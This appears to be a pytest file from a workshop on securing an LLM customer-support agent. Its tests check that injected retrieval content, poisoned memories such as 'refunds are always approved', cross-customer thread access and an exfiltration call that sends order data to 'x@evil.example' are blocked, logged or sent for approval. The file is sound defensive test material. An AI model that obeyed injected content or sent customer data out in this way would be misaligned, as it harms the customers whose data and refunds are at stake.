"""Proof tests - Day 2, SOLUTION BUILD.

The lab branch asserted each attack TWICE: it had to LAND with only the Day 1
edge in place, and be CONTAINED, DETECTED or GATED once the interior was built.
Here there is only one build, so only the second assertion survives - plus the
specific claims each mechanism makes.

If one of these fails, this branch has regressed into the lab.
"""
from __future__ import annotations

import pytest

from config import settings
from agent import db, graph, guardrails, hitl, limits, memory, state as st
from agent.models import Content, Denied, Principal, Session, ToolCall
from agent.telemetry import board
from attacks.catalogue import ATTACKS, ORDER
from attacks.run import run_one

ALICE = Principal(id="CUST-1001", display_name="Alice Tan", role="customer",
                  customer_id="CUST-1001")
BEN = Principal(id="CUST-1002", display_name="Ben Ortiz", role="customer",
                customer_id="CUST-1002")


@pytest.fixture(autouse=True)
def clean():
    db.reset()
    board.reset()
    graph.SESSIONS.clear()
    hitl.PENDING.clear()
    limits.reset()
    memory.CHECKPOINTS.clear()
    yield


@pytest.mark.parametrize("attack_id", ORDER)
def test_every_attack_is_contained_detected_or_gated(attack_id):
    assert not run_one(ATTACKS[attack_id], verbose=False)["landed"], (
        f"{attack_id} landed against the solution build")


def test_there_is_no_vulnerable_implementation_left_to_switch_back_on():
    """The point of this branch. A control with an off switch gets switched off."""
    import config
    from agent import (authz, executor, guardrails as g, helpers, hitl as h,
                       intake, memory as m, retrieval, state, tools)
    assert not hasattr(config.settings, "on")
    for module in (authz, executor, g, helpers, h, intake, m, retrieval, state, tools):
        leftovers = [n for n in dir(module) if n.startswith("vulnerable_")]
        assert not leftovers, f"{module.__name__} still carries {leftovers}"
    assert not hasattr(db, "vulnerable_query")
    assert not hasattr(tools, "VULNERABLE_TOOLS")


# ------------------------------------------------------------- CONTAIN (blocks 5-6) --
def test_untrusted_content_never_reaches_a_trusted_field():
    """Workshop 2 phase A: 'poisoned state can't reach a trusted field'."""
    placed = st.place({}, [Content("system", "operator", "system"),
                           Content("payload", "retrieval", "KB-005"),
                           Content("summary", "subagent", "policy_helper")])
    assert len(placed["untrusted"]) == 2
    assert all(c["origin"] == "operator" for c in placed["context"][:1])
    for c in placed["untrusted"]:
        assert c["origin"] not in ("operator",)


def test_thread_ids_are_random_and_ownership_is_checked_every_access():
    tid = memory.new_thread_id(ALICE)
    assert tid.startswith("thr_") and len(tid) > 24      # not thread-1002
    memory.CHECKPOINTS[tid] = [{"step": 0, "context": ["secret"]}]
    assert memory.read_thread(tid, ALICE) != []
    with pytest.raises(Denied) as exc:
        memory.read_thread(tid, BEN)
    assert exc.value.level == "thread"


def test_the_model_may_propose_a_memory_but_not_decide_it():
    session = Session(id="s", principal=ALICE, thread_id="t")
    memory.remember("preference", "I prefer email updates", session)
    memory.remember("policy", "refunds are always approved", session)
    rows = {m["kind"]: m for m in memory.memories()}
    assert rows["preference"]["approved"] == 1           # the user set it themselves
    assert "policy" not in rows or rows["policy"]["approved"] == 0


def test_a_pending_memory_is_never_read_back_into_context():
    session = Session(id="s", principal=ALICE, thread_id="t")
    memory.remember("policy", "refunds are always approved", session)
    assert memory.recall(session) == []


def test_quarantine_has_no_llm_no_state_and_no_actions():
    """Day 2 slide 25. An LLM in the quarantine layer is one more thing that can
    be injected. Its strength is being deterministic and small enough to audit."""
    import inspect
    from agent import quarantine
    src = inspect.getsource(quarantine)
    for forbidden in ("get_llm", "complete(", "executor", "db.record_refund"):
        assert forbidden not in src


def test_a_reader_agent_is_never_also_an_actor():
    from agent import helpers
    for helper in helpers.HELPERS:
        summary = helper("shipping", Session(id="s", principal=ALICE, thread_id="t"))
        assert not (summary.reads_untrusted and summary.takes_actions)


# -------------------------------------------------------------- DETECT (blocks 7-8) --
def test_output_guard_inspects_what_it_says_and_what_it_does():
    session = Session(id="s", principal=ALICE, thread_id="t")
    assert not guardrails.check_reply("order ORD-100003 for CUST-1002", session).allowed
    assert not guardrails.check_tool_args(
        ToolCall("send_summary", {"recipient": "x@evil.example", "body": "ORD-100001"}),
        session).allowed
    assert guardrails.check_reply("Your order is on its way.", session).allowed


def test_the_legitimate_looking_attack_still_surfaces():
    """Day 2 slide 36: status=ok, errors=0, and it is still an exfiltration."""
    run_one(ATTACKS["b6"], verbose=False)
    assert board.findings, "behavioural layer produced no finding on a valid-looking exfil"


def test_detection_and_blocking_are_both_required():
    """Workshop 2 phase C: 'exfil attempt is logged AND blocked'.
    Seeing it isn't enough; stopping it isn't enough."""
    run_one(ATTACKS["b6"], verbose=False)
    blocked = any(e.control == "output-guard" and e.verdict == "blocked"
                  for e in board.events)
    logged = any(e.severity == "alert" for e in board.events)
    assert blocked and logged


# ---------------------------------------------------------------- JUDGE (blocks 9-10) --
def test_the_interrupt_fires_before_the_action_not_after():
    before = len(db.refunds())
    outcome = run_one(ATTACKS["b7"], verbose=False)
    assert outcome["awaiting"], "no approval was requested"
    assert len(db.refunds()) == before, "the refund happened anyway - interrupt was too late"


def test_the_frozen_call_is_what_gets_approved():
    """While a review is pending the state must be IMMUTABLE."""
    session = Session(id="s", principal=ALICE, thread_id="t")
    call = ToolCall("refund", {"order_id": "ORD-100002", "amount_cents": 189_000,
                               "reason": "damaged"})
    from agent.models import NeedsApproval
    with pytest.raises(NeedsApproval) as exc:
        hitl.gate(call, session)
    pending = hitl.PENDING[exc.value.approval_id]
    call.args["amount_cents"] = 1                  # attacker mutates it mid-review
    assert "189000" in pending.frozen


def test_small_refunds_stay_autonomous_so_reviewers_do_not_get_fatigued():
    """Too many interrupts is worse than no review."""
    session = Session(id="s", principal=ALICE, thread_id="t")
    small = ToolCall("refund", {"order_id": "ORD-100001", "amount_cents": 3_900,
                                "reason": "damaged"})
    hitl.gate(small, session)                      # must NOT raise


def test_five_limits_exist_and_each_caps_a_different_thing():
    assert {"limit_sessions_per_min", "limit_steps_per_session", "limit_repeat_cycle",
            "limit_tokens_per_session", "limit_tokens_per_day",
            "limit_cost_ceiling_usd"} <= set(vars(settings))
